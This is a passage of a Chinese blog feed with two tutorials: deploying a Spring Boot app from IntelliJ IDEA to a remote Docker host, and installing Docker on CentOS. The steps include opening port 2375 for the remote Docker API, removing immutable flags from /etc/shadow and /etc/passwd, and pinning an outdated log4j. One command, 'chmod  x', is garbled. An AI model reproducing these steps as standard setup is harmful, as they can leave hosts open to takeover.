<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/16b5152965b0277atplv-t2oaga2asx-zoom-in-crop-mark1304000.webp" alt="img"></p>
<h4 id="3-重启docker">3. 重启docker</h4>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">systemctl stop <span class="token function">docker</span>
systemctl start <span class="token function">docker</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<h4 id="4-开放端口">4. 开放端口</h4>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">firewall-cmd <span class="token parameter variable">--zone</span><span class="token operator">=</span>public --add-port<span class="token operator">=</span><span class="token number">2375</span>/tcp <span class="token parameter variable">--permanent</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h4 id="5-Idea安装插件-重启">5. Idea安装插件,重启</h4>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/16b5155b235261e1tplv-t2oaga2asx-zoom-in-crop-mark1304000.webp" alt="img"></p>
<h4 id="6-连接远程docker">6. 连接远程docker</h4>
<h4 id="1-编辑配置">(1) 编辑配置</h4>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/16b5156207039d0etplv-t2oaga2asx-zoom-in-crop-mark1304000.webp" alt="img"></p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20220315094629072.png" alt="image-20220315094629072"></p>
<h4 id="3-连接成功，会列出远程docker容器和镜像">(3) 连接成功，会列出远程docker容器和镜像</h4>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/16b5156db1f07008tplv-t2oaga2asx-zoom-in-crop-mark1304000.webp" alt="img"></p>
<h2 id="二、新建项目">二、新建项目</h2>
<h4 id="1-创建springboot项目">1. 创建springboot项目</h4>
<p>项目结构图</p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/16b51572f7be11e0tplv-t2oaga2asx-zoom-in-crop-mark1304000.webp" alt="img"></p>
<h4 id="1-配置pom文件">(1) 配置pom文件</h4>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>project</span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://maven.apache.org/POM/4.0.0<span class="token punctuation">"</span></span>
         <span class="token attr-name"><span class="token namespace">xmlns:</span>xsi</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.w3.org/2001/XMLSchema-instance<span class="token punctuation">"</span></span>
         <span class="token attr-name"><span class="token namespace">xsi:</span>schemaLocation</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>modelVersion</span><span class="token punctuation">&gt;</span></span>4.0.0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>modelVersion</span><span class="token punctuation">&gt;</span></span>

    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>docker-demo<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>com.demo<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>1.0-SNAPSHOT<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>parent</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.springframework.boot<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>spring-boot-starter-parent<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>2.0.2.RELEASE<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>relativePath</span> <span class="token punctuation">/&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>parent</span><span class="token punctuation">&gt;</span></span>

    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>properties</span><span class="token punctuation">&gt;</span></span>
         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>project.build.sourceEncoding</span><span class="token punctuation">&gt;</span></span>UTF-8<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>project.build.sourceEncoding</span><span class="token punctuation">&gt;</span></span>
         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>project.reporting.outputEncoding</span><span class="token punctuation">&gt;</span></span>UTF-8<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>project.reporting.outputEncoding</span><span class="token punctuation">&gt;</span></span>
         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>docker.image.prefix</span><span class="token punctuation">&gt;</span></span>com.demo<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>docker.image.prefix</span><span class="token punctuation">&gt;</span></span>
         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>java.version</span><span class="token punctuation">&gt;</span></span>1.8<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>java.version</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>properties</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>build</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>plugins</span><span class="token punctuation">&gt;</span></span>
          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>plugin</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.springframework.boot<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>spring-boot-maven-plugin<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>plugin</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>plugin</span><span class="token punctuation">&gt;</span></span>
           <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>com.spotify<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
           <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>docker-maven-plugin<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
           <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>1.0.0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>
           <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>configuration</span><span class="token punctuation">&gt;</span></span>
              <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dockerDirectory</span><span class="token punctuation">&gt;</span></span>src/main/docker<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dockerDirectory</span><span class="token punctuation">&gt;</span></span>
              <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>resources</span><span class="token punctuation">&gt;</span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>resource</span><span class="token punctuation">&gt;</span></span>
                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>targetPath</span><span class="token punctuation">&gt;</span></span>/<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>targetPath</span><span class="token punctuation">&gt;</span></span>
                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>directory</span><span class="token punctuation">&gt;</span></span>${project.build.directory}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>directory</span><span class="token punctuation">&gt;</span></span>
                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>include</span><span class="token punctuation">&gt;</span></span>${project.build.finalName}.jar<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>include</span><span class="token punctuation">&gt;</span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>resource</span><span class="token punctuation">&gt;</span></span>
              <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>resources</span><span class="token punctuation">&gt;</span></span>
           <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>configuration</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>plugin</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>plugin</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>maven-antrun-plugin<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>executions</span><span class="token punctuation">&gt;</span></span>
                 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>execution</span><span class="token punctuation">&gt;</span></span>
                     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>phase</span><span class="token punctuation">&gt;</span></span>package<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>phase</span><span class="token punctuation">&gt;</span></span>
                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>configuration</span><span class="token punctuation">&gt;</span></span>
                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>target</span><span class="token punctuation">&gt;</span></span>
                            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>copy</span> <span class="token attr-name">todir</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>src/main/docker<span class="token punctuation">"</span></span> <span class="token attr-name">file</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>target/${project.artifactId}-${project.version}.${project.packaging}<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>copy</span><span class="token punctuation">&gt;</span></span>
                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>target</span><span class="token punctuation">&gt;</span></span>
                     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>configuration</span><span class="token punctuation">&gt;</span></span>
                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>goals</span><span class="token punctuation">&gt;</span></span>
                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>goal</span><span class="token punctuation">&gt;</span></span>run<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>goal</span><span class="token punctuation">&gt;</span></span>
                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>goals</span><span class="token punctuation">&gt;</span></span>
                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>execution</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>executions</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>plugin</span><span class="token punctuation">&gt;</span></span>
       <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>plugins</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>build</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependencies</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.springframework.boot<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>spring-boot-starter-web<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.springframework.boot<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>spring-boot-starter-test<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>scope</span><span class="token punctuation">&gt;</span></span>test<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>scope</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>log4j<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>log4j<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>1.2.17<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependencies</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>project</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h4 id="2-在src-main目录下创建docker目录，并创建Dockerfile文件">(2) 在src/main目录下创建docker目录，并创建Dockerfile文件</h4>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">FROM openjdk:8-jdk-alpine
ADD *.jar app.jar
ENTRYPOINT <span class="token punctuation">[</span><span class="token string">"java"</span>,<span class="token string">"-Djava.security.egd=file:/dev/./urandom"</span>,<span class="token string">"-jar"</span>,<span class="token string">"/app.jar"</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<h4 id="3-在resource目录下创建application-properties文件">(3) 在resource目录下创建application.properties文件</h4>
<pre class="line-numbers language-properties" data-language="properties"><code class="language-properties"><span class="token key attr-name">logging.config</span><span class="token punctuation">=</span><span class="token value attr-value">classpath:logback.xml</span>
<span class="token key attr-name">logging.path</span><span class="token punctuation">=</span><span class="token value attr-value">/home/developer/app/logs/</span>
<span class="token key attr-name">server.port</span><span class="token punctuation">=</span><span class="token value attr-value">8990</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<h4 id="4-创建DockerApplication文件">(4) 创建DockerApplication文件</h4>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@SpringBootApplication</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">DockerApplication</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">SpringApplication</span><span class="token punctuation">.</span><span class="token function">run</span><span class="token punctuation">(</span><span class="token class-name">DockerApplication</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> args<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h4 id="5-创建DockerController文件">(5) 创建DockerController文件</h4>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@RestController</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">DockerController</span> <span class="token punctuation">{</span>
    <span class="token keyword">static</span> <span class="token class-name">Log</span> log <span class="token operator">=</span> <span class="token class-name">LogFactory</span><span class="token punctuation">.</span><span class="token function">getLog</span><span class="token punctuation">(</span><span class="token class-name">DockerController</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span>
    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        log<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">"Hello Docker!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token string">"Hello Docker!"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h4 id="6-增加配置">(6) 增加配置</h4>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/16b5161faed2393atplv-t2oaga2asx-zoom-in-crop-mark1304000.webp" alt="img"></p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20220315095235903.png" alt="image-20220315095235903"></p>
<ul>
<li><strong>Image tag :</strong> 指定镜像名称和<strong>tag</strong>，镜像名称为 <strong>docker-demo</strong>，<strong>tag</strong></li>
<li><strong>Bind ports :</strong> 绑定宿主机端口到容器内部端口。格式为[宿主机端口]:[容器内部端口]</li>
<li><strong>Bind mounts :</strong> 将宿主机目录挂到到容器内部目录中。格式为[宿主机目录]:[容器内部目录]。这个springboot项目会将日志打印在容器 <strong>/home/developer/app/logs/</strong> 目录下，将宿主机目录挂载到容器内部目录后，那么日志就会持久化容器外部的宿主机目录中。</li>
</ul>
<h4 id="7-Maven打包">(7) Maven打包</h4>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/16b5167788e14ee1tplv-t2oaga2asx-zoom-in-crop-mark1304000.webp" alt="img"></p>
<h4 id="8-运行">(8) 运行</h4>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/16b51679f663afe8tplv-t2oaga2asx-zoom-in-crop-mark1304000.webp" alt="img"></p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/16b5167bec448fe4tplv-t2oaga2asx-zoom-in-crop-mark1304000.webp" alt="img"></p>
<p>先pull基础镜像，然后再打包镜像，并将镜像部署到远程docker运行</p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/16b5168992f0d1f4tplv-t2oaga2asx-zoom-in-crop-mark1304000.webp" alt="img"></p>
<p>这里我们可以看到镜像名称为docker-demo:1.1，docker容器为docker-server</p>
<h4 id="9-运行成功">(9) 运行成功</h4>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/16b5168d1c05f997tplv-t2oaga2asx-zoom-in-crop-mark1304000.webp" alt="img"></p>
<h4 id="10-浏览器访问">(10) 浏览器访问</h4>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/16b5168ed469a871tplv-t2oaga2asx-zoom-in-crop-mark1304000.webp" alt="img"></p>
<h4 id="11-日志查看">(11) 日志查看</h4>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/16b516908d72a340tplv-t2oaga2asx-zoom-in-crop-mark1304000.webp" alt="img"></p>
<h1>进入容器命令行</h1>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> container <span class="token function">ls</span>
<span class="token function">docker</span> <span class="token builtin class-name">exec</span> <span class="token parameter variable">-it</span> 3052dd731d05  <span class="token function">bash</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<h1>查看容器内进程运行信息</h1>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 获取容器ID </span>
<span class="token function">docker</span> container <span class="token function">ls</span><span class="token operator">|</span><span class="token function">grep</span> <span class="token number">7.0</span>.0 
<span class="token comment"># 查看进程信息</span>
<span class="token function">docker</span> <span class="token function">top</span> ac6f540b3cd4<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<h1>修改host映射</h1>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># Docker 修改host映射 https://cloud.tencent.com/developer/article/1175087</span>
<span class="token operator">&gt;</span> <span class="token builtin class-name">echo</span> <span class="token string">"1.2.3.4 test.zt.ss.com"</span> <span class="token operator">&gt;&gt;</span> /etc/hosts<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
]]></content>
      <categories>
        <category>服务器</category>
      </categories>
      <tags>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title>配置Docker环境</title>
    <url>/20221030/8c5d6123.html</url>
    <content><![CDATA[<h1>CentOS配置Docker环境</h1>
<h2 id="1-修改docker配置">1.  修改docker配置</h2>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">mkdir</span> /etc/docker
<span class="token function">vim</span> /etc/docker/daemon.json<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>添加内容</p>
<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span>
    <span class="token property">"registry-mirrors"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">"https://7ixh250y.mirror.aliyuncs.com"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
    <span class="token property">"data-root"</span><span class="token operator">:</span> <span class="token string">"/data/docker_mirror"</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>查看填写内容</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cat</span> /etc/docker/daemon.json<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<blockquote>
<p>registry-mirrors： 镜像加速</p>
<p>insecure-registries： 私有仓库地址</p>
<p>data-root：docker 数据保存地址，放到盘大的目录防止根目录的盘满</p>
</blockquote>
<h2 id="2-安装docker服务">2. 安装docker服务</h2>
<p>可选(如果之前有安装，可以选择卸载掉)</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#查看已安装的docker包</span>
yum list installed <span class="token operator">|</span> <span class="token function">grep</span> <span class="token function">docker</span>
<span class="token comment">#卸载已安装的包</span>
yum remove xxx  xxx xx<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>执行命令开始安装docker</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#安装依赖  </span>
yum <span class="token function">install</span> <span class="token parameter variable">-y</span> yum-utils
<span class="token comment">#添加docker源</span>
yum-config-manager --add-repo http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo
<span class="token comment">#查看docker-ce支持版本 </span>
yum list docker-ce --showduplicates<span class="token operator">|</span><span class="token function">sort</span> <span class="token parameter variable">-r</span>
<span class="token comment">#开启一些权限</span>
chattr <span class="token parameter variable">-i</span> /etc/group <span class="token operator">&amp;&amp;</span>  chattr <span class="token parameter variable">-i</span> /etc/passwd <span class="token operator">&amp;&amp;</span> chattr <span class="token parameter variable">-i</span> /etc/gshadow <span class="token operator">&amp;&amp;</span> chattr <span class="token parameter variable">-i</span> /etc/shadow
<span class="token comment">#开始正式安装docker       </span>
yum <span class="token function">install</span> <span class="token parameter variable">-y</span> docker-ce-19.03.9  docker-ce-cli-19.03.9

systemctl start <span class="token function">docker</span>
<span class="token comment"># 验证：执行docker -v ,如果出现版本号就代表成功了</span>
<span class="token function">docker</span> <span class="token parameter variable">-v</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<ul>
<li>
<p>开机启动Dockerr服务</p>
  <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">systemctl <span class="token builtin class-name">enable</span> docker.service
systemctl <span class="token builtin class-name">enable</span> docker.socket<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
</li>
<li>
<p>开机启动检查：<code>systemctl list-unit-files | grep docker</code></p>
  <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># systemctl list-unit-files | grep docker</span>
docker.service                             enabled         enabled      
docker.socket                              enabled         enabled<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
</li>
</ul>
<p>说明： 不建议安装最新版本的docker，有可能ranche支持会不好</p>
<h2 id="3-安装Docker-Compose">3. 安装Docker Compose</h2>
<h3 id="（1）下载-docker-compose">（1）下载 docker-compose</h3>
<p>执行如下命令进行下载</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> <span class="token parameter variable">-L</span> <span class="token string">"https://github.com/docker/compose/releases/download/1.29.2/docker-compose-<span class="token variable"><span class="token variable">$(</span><span class="token function">uname</span> <span class="token parameter variable">-s</span><span class="token variable">)</span></span>-<span class="token variable"><span class="token variable">$(</span><span class="token function">uname</span> <span class="token parameter variable">-m</span><span class="token variable">)</span></span>"</span> <span class="token parameter variable">-o</span> /usr/local/bin/docker-compose<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>若速度较慢，可以使用如下命令：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> <span class="token parameter variable">-L</span> <span class="token string">"https://mirror.ghproxy.com/https://github.com/docker/compose/releases/download/1.29.2/docker-compose-<span class="token variable"><span class="token variable">$(</span><span class="token function">uname</span> <span class="token parameter variable">-s</span><span class="token variable">)</span></span>-<span class="token variable"><span class="token variable">$(</span><span class="token function">uname</span> <span class="token parameter variable">-m</span><span class="token variable">)</span></span>"</span> <span class="token parameter variable">-o</span> /usr/local/bin/docker-compose<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h3 id="（2）修改目录权限">（2）修改目录权限</h3>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">chmod</span>  x /usr/local/bin/docker-compose<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h3 id="（3）创建软连接">（3）创建软连接</h3>
